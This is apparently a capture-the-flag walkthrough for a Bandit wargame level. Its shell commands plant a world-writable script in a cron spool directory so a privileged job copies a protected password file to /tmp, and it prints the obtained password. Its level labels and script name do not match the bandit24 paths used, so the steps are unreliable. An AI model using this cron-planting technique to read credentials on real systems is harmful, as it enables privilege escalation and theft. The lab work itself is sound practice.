# Bandit Level 22 → Level 23

### 🔑 Objective
Reverse-engineer an automated Cron script that loops through and executes any custom shell binaries placed within a specific system spool path (`/var/spool/bandit24/foo`).

### 🛠️ Core Command Blueprint
```bash
# Step 1: Enumerate the target script profile properties
cat /usr/bin/cronjob_bandit23.sh

# Step 2: Write a custom exploit shell pipeline to read the password asset
echo '#!/bin/bash' > /tmp/get_pass.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit24.txt' >> /tmp/get_pass.sh

# Step 3: Grant universal operational access bits to the script
chmod 777 /tmp/get_pass.sh

# Step 4: Move the exploit script into the Cron automated processing loop path
cp /tmp/get_pass.sh /var/spool/bandit24/foo/

# Step 5: Wait 60 seconds for execution, then read the dumped text payload
cat /tmp/bandit24.txt

# Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
